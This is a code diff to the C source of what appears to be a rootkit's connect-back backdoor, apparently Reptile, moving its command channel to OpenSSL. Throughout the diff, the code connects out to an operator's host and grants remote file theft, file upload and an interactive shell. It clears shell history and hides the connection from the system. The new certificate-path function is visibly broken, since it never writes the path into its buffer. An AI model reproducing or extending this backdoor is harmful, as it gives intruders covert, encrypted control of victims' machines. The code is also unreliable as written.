@@ -20,6 +20,7 @@
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
 char *rcfile;
+char *certfile;
 
 #ifndef _REPTILE_
 
@@ -31,11 +32,11 @@ void usage(char *argv0)
 
 #endif
 
-int get_file(int client)
+int get_file(openssl_ctx *ctx)
 {
 	int ret, len, fd;
 
-	ret = pel_recv_msg(client, message, &len);
+	ret = pel_recv_msg(ctx, message, &len);
 
 	if (ret != PEL_SUCCESS)
 		return (ERROR);
@@ -58,7 +59,7 @@ int get_file(int client)
 		if (len < 0)
 			return (ERROR);
 
-		ret = pel_send_msg(client, message, len);
+		ret = pel_send_msg(ctx, message, len);
 
 		if (ret != PEL_SUCCESS)
 			return (ERROR);
@@ -66,11 +67,11 @@ int get_file(int client)
 	return 0;
 }
 
-int put_file(int client)
+int put_file(openssl_ctx *ctx)
 {
 	int ret, len, fd;
 
-	ret = pel_recv_msg(client, message, &len);
+	ret = pel_recv_msg(ctx, message, &len);
 
 	if (ret != PEL_SUCCESS)
 		return (ERROR);
@@ -85,7 +86,7 @@ int put_file(int client)
 		return (ERROR);
 
 	while (1) {
-		ret = pel_recv_msg(client, message, &len);
+		ret = pel_recv_msg(ctx, message, &len);
 
 		if (ret != PEL_SUCCESS)
 			return (ERROR);
@@ -99,7 +100,7 @@ int put_file(int client)
 	return 0;
 }
 
-int runshell(int client)
+int runshell(openssl_ctx *ctx)
 {
 	fd_set rd;
 	struct winsize ws;
@@ -117,7 +118,7 @@ int runshell(int client)
 	chdir(HOMEDIR);
 	putenv("HISTFILE=");
 
-	ret = pel_recv_msg(client, message, &len);
+	ret = pel_recv_msg(ctx, message, &len);
 
 	if (ret != PEL_SUCCESS)
 		return (ERROR);
@@ -125,7 +126,7 @@ int runshell(int client)
 	message[len] = '\0';
 	setenv("TERM", (char *)message, 1);
 
-	ret = pel_recv_msg(client, message, &len);
+	ret = pel_recv_msg(ctx, message, &len);
 
 	if (ret != PEL_SUCCESS || len != 4)
 		return (ERROR);
@@ -138,7 +139,7 @@ int runshell(int client)
 	if (ioctl(pty, TIOCSWINSZ, &ws) < 0)
 		return (ERROR);
 
-	ret = pel_recv_msg(client, message, &len);
+	ret = pel_recv_msg(ctx, message, &len);
 
 	if (ret != PEL_SUCCESS)
 		return (ERROR);
@@ -169,7 +170,8 @@ int runshell(int client)
 	}
 
 	if (pid == 0) {
-		close(client);
+		//close(client);
+		openssl_ctx_delete(ctx); // TODO(CMK): appropriate?
 		close(pty);
 
 		if (setsid() < 0) {
@@ -206,6 +208,8 @@ int runshell(int client)
 	} else {
 		close(tty);
 
+		int client = openssl_get_fd(ctx);
+
 		while (1) {
 			FD_ZERO(&rd);
 			FD_SET(client, &rd);
@@ -217,7 +221,7 @@ int runshell(int client)
 				return (ERROR);
 
 			if (FD_ISSET(client, &rd)) {
-				ret = pel_recv_msg(client, message, &len);
+				ret = pel_recv_msg(ctx, message, &len);
 
 				if (ret != PEL_SUCCESS)
 					return (ERROR);
@@ -233,7 +237,7 @@ int runshell(int client)
 				if (len < 0)
 					return (ERROR);
 
-				ret = pel_send_msg(client, message, len);
+				ret = pel_send_msg(ctx, message, len);
 
 				if (ret != PEL_SUCCESS)
 					return (ERROR);
@@ -293,9 +297,21 @@ int build_rcfile_path(void)
 	return 0;
 }
 
+int build_certfile_path(void)
+{
+	int len = snprintf(NULL, 0, "/%s/%s_cert.pem", NAME, NAME) + 1;
+	certfile = (char *)malloc(len);
+	
+	if (certfile == NULL)
+		return -1;
+
+	snprintf(NULL, len, "/%s/%s_cert.pem", NAME, NAME);
+	return 0;
+}
+
 int main(int argc, char **argv)
 {
-	int ret, len, pid, opt, client, arg0_len, delay = 0;
+	int ret, len, pid, opt, arg0_len, delay = 0;
 	short int connect_back_port = 0;
 	char *connect_back_host = NULL;
 	char *secret = NULL;
@@ -373,6 +389,9 @@ int main(int argc, char **argv)
 	if (build_rcfile_path())
 		goto out;
 
+	if (build_certfile_path())
+		goto out;
+
 	pid = fork();
 
 	if (pid < 0)
@@ -387,14 +406,22 @@ int main(int argc, char **argv)
 	for (n = 0; n < 1024; n++)
 		close(n);
 
+	openssl_ctx *ctx = NULL;
+
 	do {
 		if (delay > 0)
 			sleep(delay);
 
-		client = socket(PF_INET, SOCK_STREAM, 0);
-		if (client < 0)
-			continue;
-
+		/* Create an OpenSSL context instead of using raw sockets */
+		ctx = openssl_ctx_new();
+		if (!ctx) {
+			continue; // TODO(CMK): not sure this makes sense, just copying old code
+		}
+		if (!openssl_client_init(ctx, certfile)) {
+			continue; // TODO(CMK): not sure this makes sense, just copying old code
+		}
+		
+		/* Build the remote address still so we can hide it. */
 		client_host = gethostbyname(connect_back_host);
 		if (client_host == NULL)
 			continue;
@@ -405,22 +432,22 @@ int main(int argc, char **argv)
 		client_addr.sin_family = AF_INET;
 		client_addr.sin_port = htons(connect_back_port);
 
-		ret = connect(client, (struct sockaddr *)&client_addr,
-			      sizeof(client_addr));
 
-		if (ret < 0) {
-			close(client);
-			continue;
+		if (!openssl_client_connect(ctx, connect_back_host, connect_back_port)) {
+			openssl_ctx_delete(ctx);
+			ctx = NULL;
+			continue; // TODO(CMK): not sure this makes sense, just copying old code
 		}
 
 #ifdef _REPTILE_
 		hide_conn(client_addr, HIDE);
 #endif
 
-		ret = pel_server_init(client, secret);
+		ret = pel_server_init(ctx, secret);
 
 		if (ret != PEL_SUCCESS) {
-			shutdown(client, 2);
+			openssl_ctx_delete(ctx);
+			ctx = NULL;
 
 #ifdef _REPTILE_
 			hide_conn(client_addr, UNHIDE);
@@ -431,7 +458,7 @@ int main(int argc, char **argv)
 
 	connect:
 
-		ret = pel_recv_msg(client, message, &len);
+		ret = pel_recv_msg(ctx, message, &len);
 
 		if (ret == PEL_SUCCESS || len == 1) {
 			if (strcmp((char *)message, EXIT) == 0)
@@ -439,28 +466,28 @@ int main(int argc, char **argv)
 
 			switch (message[0]) {
 			case GET_FILE:
-				ret = get_file(client);
+				ret = get_file(ctx);
 
 				if (ret)
 					goto connect;
 
-				if (pel_send_msg(client, (unsigned char *)EXIT,
+				if (pel_send_msg(ctx, (unsigned char *)EXIT,
 						 EXIT_LEN) != PEL_SUCCESS)
 					goto end;
 
 				goto connect;
 			case PUT_FILE:
-				put_file(client);
+				put_file(ctx);
 				goto connect;
 			case RUNSHELL:
-				runshell(client);
-				if (pel_send_msg(client, (unsigned char *)EXIT,
+				runshell(ctx);
+				if (pel_send_msg(ctx, (unsigned char *)EXIT,
 						 EXIT_LEN) != PEL_SUCCESS)
 					goto end;
 
 				goto connect;
 			case SET_DELAY:
-				if (pel_recv_msg(client, message, &len) !=
+				if (pel_recv_msg(ctx, message, &len) !=
 				    PEL_SUCCESS)
 					goto end;
 
@@ -476,7 +503,8 @@ int main(int argc, char **argv)
 			}
 		}
 	end:
-		shutdown(client, 2);
+		openssl_ctx_delete(ctx);
+		ctx = NULL;
 
 #ifdef _REPTILE_
 		hide_conn(client_addr, UNHIDE);
